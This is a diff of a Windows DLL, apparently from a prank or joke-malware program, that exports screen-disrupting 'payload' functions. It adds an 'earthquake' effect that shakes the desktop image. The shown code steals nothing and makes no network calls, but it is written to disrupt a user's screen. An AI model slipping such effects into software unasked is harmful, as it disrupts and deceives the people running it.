@@ -1,6 +1,6 @@
 #include <Windows.h>
 
-#define PAYLOAD extern "C" __declspec(dllexport) void
+#define PAYLOAD extern "C" __declspec(dllexport) void __stdcall
 #define ACTION PAYLOAD
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused);
@@ -16,6 +16,7 @@ PAYLOAD payloadTunnel();
 PAYLOAD payloadDrawErrors();
 PAYLOAD payloadInvertScreen();
 PAYLOAD payloadCursor(int power);
+PAYLOAD payloadEarthquake(int delay, int power);
 
 ACTION clearWindows();
 
@@ -148,6 +149,28 @@ BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
 		SendMessage(hwnd, WM_CLOSE, 0, 0);
 	}
 	return TRUE;
+}
+
+HBITMAP screenshot = NULL;
+HDC dc, dc2;
+int w, h;
+
+PAYLOAD payloadEarthquake(int delay, int power) {
+	if (screenshot == NULL) {
+		w = GetSystemMetrics(SM_CXSCREEN);
+		h = GetSystemMetrics(SM_CYSCREEN);
+
+		dc = GetWindowDC(GetDesktopWindow());
+
+		screenshot = CreateCompatibleBitmap(dc, w, h);
+		dc2 = CreateCompatibleDC(dc);
+		SelectObject(dc2, screenshot);
+	}
+
+	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
+	BitBlt(dc, 0, 0, w, h, dc2, (random() % power) - (power/2), (random() % power) - (power/2), SRCCOPY);
+	Sleep(delay*10);
+	BitBlt(dc, 0, 0, w, h, dc2, 0, 0, SRCCOPY);
 }
 
 void strReverseW(LPWSTR str) {
